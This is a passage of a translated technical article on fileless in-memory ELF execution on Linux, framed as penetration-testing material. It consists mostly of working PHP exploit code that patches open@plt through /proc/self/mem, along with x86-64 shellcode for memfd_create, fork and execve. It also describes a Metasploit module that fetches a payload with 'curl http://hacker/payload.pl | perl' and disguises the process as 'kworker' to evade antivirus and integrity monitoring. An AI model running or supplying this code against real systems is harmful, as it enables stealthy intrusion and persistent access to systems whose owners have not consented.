class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[INFO] open@plt addr: 0x'</span></span> . dechex($open_addr) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Rewriting open@plt address\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'wb'</span></span>);</code> </pre> <br><p>  Now you can go directly to the download of our executable file. <br>  First, create an anonymous file: </p><br><pre> <code class="php hljs">$shellcode_loc = $pie_base + <span class="hljs-number"><span class="hljs-number">0x100</span></span>; $shellcode=<span class="hljs-string"><span class="hljs-string">"\x48\x31\xD2\x52\x54\x5F\x6A\x01\x5E\x68\x3F\x01\x00\x00\x58\x0F\x05\x5A\xC3"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fseek($mem, (PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base + $open_php); fwrite($mem, packlli($shellcode_loc)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Address written. Executing cmd\n"</span></span>; $fp = fopen(<span class="hljs-string"><span class="hljs-string">'fd'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>);</code> </pre> <br><p>  Write the load in an anonymous file: </p><br><pre> <code class="php hljs">fwrite($fp, $elf);</code> </pre> <br><p>  Looking for file descriptor number: </p><br><pre> <code class="php hljs">$found = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $fds = scandir(<span class="hljs-string"><span class="hljs-string">"/proc/self/fd"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>($fds <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $fd) { $path = <span class="hljs-string"><span class="hljs-string">"/proc/self/fd/$fd"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!is_link($path)) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strstr(readlink($path), <span class="hljs-string"><span class="hljs-string">"memfd"</span></span>)) { $found = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!$found) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[-] memfd not found'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Next, write to the stack the path to the executable file: </p><br><pre> <code class="php hljs">fseek($mem, $stack); fwrite($mem, <span class="hljs-string"><span class="hljs-string">"{$path}\x00"</span></span>); $filename_ptr = $stack; $stack += strlen($path) + <span class="hljs-number"><span class="hljs-number">1</span></span>; fseek($mem, $stack);</code> </pre> <br><p>  And the launch arguments passed to the executable program: </p><br><pre> <code class="php hljs">fwrite($mem, str_replace(<span class="hljs-string"><span class="hljs-string">" "</span></span>, <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, $args) . <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>); $str_ptr = $stack; $argv_ptr = $arg_ptr = $stack + strlen($args) + <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>(explode(<span class="hljs-string"><span class="hljs-string">' '</span></span>, $args) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $arg) { fseek($mem, $arg_ptr); fwrite($mem, packlli($str_ptr)); $arg_ptr += <span class="hljs-number"><span class="hljs-number">8</span></span>; $str_ptr += strlen($arg) + <span class="hljs-number"><span class="hljs-number">1</span></span>; } fseek($mem, $arg_ptr); fwrite($mem, packlli(<span class="hljs-number"><span class="hljs-number">0x0</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Argv: "</span></span> . $args . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Next, using the <code>fork()</code> call, we execute our payload: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Starting ELF\n"</span></span>; $shellcode = <span class="hljs-string"><span class="hljs-string">"\x6a\x39\x58\x0f\x05\x85\xc0\x75\x28\x6a\x70\x58\x0f\x05\x6a\x39\x58\x0f\x05\x85\xc0\x75\x1a\x48\xbf"</span></span> . packlli($filename_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\xbe"</span></span> . packlli($argv_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\x31\xd2\x6a\x3b\x58\x0f\x05\xc3\x6a\x00\x5f\x6a\x3c\x58\x0f\x05"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fopen(<span class="hljs-string"><span class="hljs-string">'done'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>();</code> </pre> <br><h4 id="shellkod">  Shellcode </h4><br><p>  A shellcode usually means a sequence of bytes that is placed in memory, and then executed ‚Äî usually in the context of another program, using buffer overflow attacks and others.  In our case, the shellcode does not return to us the command line prompt of the remote server (Shell itself), but allows us to execute the commands we need. </p><br><p>  To get the necessary sequence of bytes, you can either write code in C, then translate it into assembly language, or write in assembler from scratch. </p><br><p>  We will understand what lies behind the sequence of bytes from the listings above. </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  The launch of our program begins with a <code>fork</code> .  57 is the number value of the system call identifier for 64-bit systems.  The table can be found <a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">here</a> . </p><br><p>  Next we call <code>setsid</code> (numeric identifier 112) to convert the child process to the parent process: </p><br><pre> <code class="plaintext hljs">push 112 pop rax syscall</code> </pre> <br><p>  Then we execute another <code>fork</code> : </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  Then we execute the <code>execve()</code> already familiar to you: </p><br><pre> <code class="plaintext hljs">; execve mov rdi, 0xcafebabecafebabe ; filename mov rsi, 0xdeadbeefdeadbeef ; argv xor rdx, rdx ; envp push 0x3b pop rax syscall push -1 pop rax ret</code> </pre> <br><p>  And we complete the process with <code>exit()</code> (60): </p><br><pre> <code class="plaintext hljs">; exit quit: push 0 pop rdi push 60 pop rax syscall</code> </pre> <br><p>  Thus, we have performed the replacement of the open () function code on the go.  Our executable file was placed in memory and executed using PHP interpreter tools.  System calls are presented in the form of shellcodes. </p><br><h3 id="metasploit-framework">  Metasploit Framework </h3><br><p>  To compile the techniques described above, we have prepared a <a href="https://github.com/fbkcs/msf-elf-in-memory-execution">module for MSF</a> . </p><br><p>  To add it to Metasploit, simply copy the module file to the <code>$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb</code> directory and then execute the <code>reload_all</code> command in the framework console. <br>  To use our module, enter <code>use post/linux/manage/download_exec_elf_in_memory</code> (or another way, depending on the directory in which the module file was placed) <br>  Before you use it, you must specify the necessary options.  The list of options is displayed using the <code>show options</code> </p><br><p>  <code>ARGS</code> - Arguments for the executable file </p><br><p>  <code>FILE</code> - the path to the executable file.  In our case, this is Netcat. </p><br><p>  <code>NAME</code> is the process name.  You can call it as you like.  For example, for greater stealth it may be kworker: 1 well, or to demonstrate something comic, for example KittyCat </p><br><p>  <code>SESSION</code> - meterpreter session.  It is understood that this module will be used for post-operation purposes. </p><br><p>  Further we denote the host on which the http-server with our load and its port will be located - in the <code>SRVHOST</code> and <code>SRVPORT</code> respectively. </p><br><p>  <code>VECTOR</code> is the method by which the execution of the program in memory will be achieved, the parameter is not necessary if it is empty the script itself will determine the presence of the necessary interpreters.  Currently supported by PHP, Python or Perl. </p><br><p>  Execute using the <code>exploit</code> or <code>run</code> command </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/y9vRUItW_5c" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p>  It works as follows - we specify the desired session, it can be either meterpreter, or the usual reverse-shell.  Next, we indicate the local path to our elf, arguments and the desired name in the list of processes.  After the start, the local web server will be launched for the payload hosting, and the session will be searched for "rocking chairs", currently curl and wget are supported.  After finding at least one of them, a search will be performed for all interpreters, if we have not specified in the <code>VECTOR</code> parameter which one we need.  Well, if successful, the command will be executed to load the payload from our web server and transfer it via pipe to the correct interpreter, i.e.  something like <code>$ curl http://hacker/payload.pl | perl</code> <code>$ curl http://hacker/payload.pl | perl</code> </p><br><h3 id="vmesto-zaklyucheniya">  Instead of a conclusion. </h3><br><p>  Fileless loading of ELF files in Linux is a useful technique for penetration testing.  This is a fairly silent way, able to withstand a wide range of anti-virus protection, integrity monitoring systems and monitoring systems that monitor changes in the contents of a hard disk.  This way you can easily maintain access to the target system, while leaving a minimum of traces. <br>  In this article, we used interpreted programming languages, often installed by default in Linux distributions, embedded firmware, routers, and mobile devices.  Separately, I would like to thank the author of <a href="https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html">this article</a> , who inspired us to this recording. </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/430902/">https://habr.com/ru/post/430902/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../430890/index.html">Where Agile is terrible, especially Scrum</a></li>
<li><a href="../430892/index.html">The combination of cross-platform and native approach in the development of mobile applications</a></li>
<li><a href="../430894/index.html">Situation: brands spend more and more money on advertising in podcasts - we understand why</a></li>
<li><a href="../430896/index.html">The Linux Foundation has established funds for GraphQL and Ceph - why they are needed and what to expect from them.</a></li>
<li><a href="../430900/index.html">The first laser in history: how it was</a></li>
<li><a href="../430906/index.html">Mom sleeps at night - we collect OpenCV for Raspbian</a></li>
<li><a href="../430908/index.html">Power Transducer Control Module: Design and Build</a></li>
<li><a href="../430910/index.html">Fulbright Scholarship: How and Why?</a></li>
<li><a href="../430912/index.html">We deduce a liar to clean water: an interview is not an employment relationship. Naturally</a></li>
<li><a href="../430914/index.html">Analysis of black market prices for personal data and breaking through</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>